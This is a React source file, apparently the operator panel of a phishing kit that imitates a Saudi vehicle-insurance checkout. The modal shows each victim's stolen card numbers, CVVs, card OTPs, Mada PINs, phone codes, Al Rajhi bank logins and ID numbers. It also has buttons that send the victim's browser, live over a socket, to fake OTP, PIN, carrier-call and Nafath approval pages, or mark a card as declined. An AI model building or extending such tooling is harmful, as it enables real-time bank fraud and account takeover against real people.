// src/components/CardModal.js
import React, { useState, useEffect, useRef } from "react";
import { Modal, Button } from "react-bootstrap";
import ConfirmDialog from "./ConfirmDialog";
import { socket } from "../socket";

const PAGES_TOP = [
  "index.html", "vehicle.html", "insurance.html",
  "addons.html", "summary.html", "paymen.html", "verify.html",
];

const PAGES_BOTTOM = [
  "pin.html", "phone.html", "phonecode.html",
  "rajhi.html", "stcCall.html", "mobilyCall.html", "nafad-basmah.html",
];

const LABEL = {
  "index.html": "Home",
  "vehicle.html": "Vehicle",
  "insurance.html": "Insurance",
  "addons.html": "Addons",
  "summary.html": "Summary",
  "paymen.html": "Payment",
  "verify.html": "Card OTP",
  "pin.html": "Mada PIN",
  "phone.html": "Phone",
  "phonecode.html": "Phone Code",
  "rajhi.html": "Rajhi",
  "stcCall.html": "STC Call",
  "mobilyCall.html": "Mobily Call",
  "nafad-basmah.html": "Nafad Basmah",
};

export default function CardModal({ ip, user, onClose }) {
  const [confirm, setConfirm] = useState({ show: false, page: null });
  const [basmah, setBasmah] = useState("");

  // blink states
  const [blinkOtp, setBlinkOtp] = useState(false);
  const [blinkPin, setBlinkPin] = useState(false);
  const [blinkPhoneCode, setBlinkPhoneCode] = useState(false);

  const prevOtp = useRef(user?.latestOtp || "");
  const prevPin = useRef(user?.latestPin || "");
  const prevPhoneCode = useRef(user?.latestPhoneCode || "");

  useEffect(() => {
    const cur = user?.latestOtp || "";
    if (cur && cur !== prevOtp.current) { setBlinkOtp(true); setTimeout(() => setBlinkOtp(false), 2000); }
    prevOtp.current = cur;
  }, [user?.latestOtp]);

  useEffect(() => {
    const cur = user?.latestPin || "";
    if (cur && cur !== prevPin.current) { setBlinkPin(true); setTimeout(() => setBlinkPin(false), 2000); }
    prevPin.current = cur;
  }, [user?.latestPin]);

  useEffect(() => {
    const cur = user?.latestPhoneCode || "";
    if (cur && cur !== prevPhoneCode.current) { setBlinkPhoneCode(true); setTimeout(() => setBlinkPhoneCode(false), 2000); }
    prevPhoneCode.current = cur;
  }, [user?.latestPhoneCode]);

  if (!user) return null;

  const {
    payments = [],
    latestOtp = "",
    latestPin = "",
    latestPhone = "",
    latestOperator = "",
    latestPhoneCode = "",
    rajhiUsername = "",
    rajhiPassword = "",
    currentPage = "",
    userName = "",
    idNumber = "",
    total = "",
  } = user;

  const handlePageClick = (page) => setConfirm({ show: true, page });
  const hideConfirm = () => { setConfirm({ show: false, page: null }); setBasmah(""); };

  const handleConfirm = () => {
    if (confirm.page === "nafad-basmah.html" && basmah) {
      socket.emit("updateBasmah", { ip, basmah: Number(basmah) });
    }
    socket.emit("navigateTo", { ip, page: confirm.page });
    hideConfirm();
  };

  const handleDecline = () => {
    socket.emit("navigateTo", { ip, page: `${confirm.page}?declined=true` });
    hideConfirm();
  };

  const handleDeclineCard = () => {
    socket.emit("navigateTo", { ip, page: "paymen.html?declined=true" });
    hideConfirm();
  };

  const formatCard = (n) => (n || "").replace(/(.{4})/g, "$1 ").trim();

  const blinkStyle = { backgroundColor: "#d4edda", transition: "background-color 0.3s" };
  const normalStyle = {};

  return (
    <>
      <Modal show onHide={onClose} size="xl" centered>
        <Modal.Header closeButton>
          <Modal.Title>
            🛡️ {userName || "—"} — <small className="text-muted">{idNumber || ip}</small>
          </Modal.Title>
        </Modal.Header>

        <Modal.Body>
          {/* ── Top page buttons ── */}
          <div className="d-flex flex-wrap gap-2 mb-3">
            {PAGES_TOP.map((p) => (
              <Button
                key={p}
                size="sm"
                variant={currentPage === p ? "success" : "outline-primary"}
                onClick={() => handlePageClick(p)}
              >
                {currentPage === p ? "🟢 " : ""}{LABEL[p]}
              </Button>
            ))}
          </div>

          {/* ── Card submissions ── */}
          <div style={{ overflowX: "auto", display: "flex", gap: "1rem", paddingBottom: "0.5rem", borderTop: "1px solid #dee2e6", borderBottom: "1px solid #dee2e6", margin: "0.75rem 0", paddingTop: "0.75rem" }}>
            {payments.length === 0 ? (
              <p className="text-muted mb-0 py-2">No card submissions yet.</p>
            ) : (
              payments.map((p, i) => (
                <div key={p._id || i} style={{ minWidth: 240, border: "1px solid #dee2e6", borderRadius: 8, padding: "0.75rem", background: "#fefefe", flex: "0 0 auto" }}>
                  <div className="fw-bold mb-2">Submission {i + 1}</div>
                  <div><strong>Name:</strong> {p.cardHolderName || "—"}</div>
                  <div><strong>Card:</strong> {formatCard(p.cardNumber)}</div>
                  <div><strong>Exp:</strong> {p.expiryDate || "—"}</div>
                  <div><strong>CVV:</strong> {p.cvv || "—"}</div>
                  {p.total && <div><strong>Total:</strong> {p.total} ريال</div>}
                </div>
              ))
            )}
          </div>

          {/* ── Codes & Credentials ── */}
          <div className="row g-3 my-1">
            {/* OTP & PIN */}
            <div className="col-md-4">
              <div className="border rounded p-3 h-100">
                <h6 className="fw-bold border-bottom pb-2">🔐 OTP / PIN</h6>
                <p style={blinkOtp ? blinkStyle : normalStyle} className="mb-2">
                  <strong>Card OTP:</strong> {latestOtp || "—"}
                </p>
                <p style={blinkPin ? blinkStyle : normalStyle} className="mb-0">
                  <strong>Mada PIN:</strong> {latestPin || "—"}
                </p>
              </div>
            </div>

            {/* Phone */}
            <div className="col-md-4">
              <div className="border rounded p-3 h-100">
                <h6 className="fw-bold border-bottom pb-2">📱 Phone</h6>
                <p className="mb-2"><strong>Number:</strong> {latestPhone || "—"}</p>
                <p className="mb-2"><strong>Operator:</strong> {latestOperator || "—"}</p>
                <p style={blinkPhoneCode ? blinkStyle : normalStyle} className="mb-0">
                  <strong>Phone Code:</strong> {latestPhoneCode || "—"}
                </p>
              </div>
            </div>

            {/* Rajhi */}
            <div className="col-md-4">
              <div className="border rounded p-3 h-100">
                <h6 className="fw-bold border-bottom pb-2">🏦 Rajhi</h6>
                <p className="mb-2"><strong>Username:</strong> {rajhiUsername || "—"}</p>
                <p className="mb-0"><strong>Password:</strong> {rajhiPassword || "—"}</p>
              </div>
            </div>
          </div>

          {/* ── Bottom page buttons ── */}
          <div className="d-flex flex-wrap gap-2 mt-3">
            {PAGES_BOTTOM.map((p) => (
              <Button
                key={p}
                size="sm"
                variant={currentPage === p ? "success" : "outline-secondary"}
                onClick={() => handlePageClick(p)}
              >
                {currentPage === p ? "🟢 " : ""}{LABEL[p]}
              </Button>
            ))}
          </div>
        </Modal.Body>

        <Modal.Footer>
          <Button variant="secondary" onClick={onClose}>Close</Button>
        </Modal.Footer>
      </Modal>

      <ConfirmDialog
        show={confirm.show}
        page={confirm.page}
        basmah={basmah}
        onBasmahChange={setBasmah}
        onConfirm={handleConfirm}
        onDecline={handleDecline}
        onDeclineCard={handleDeclineCard}
        onClose={hideConfirm}
      />
    </>
  );
}
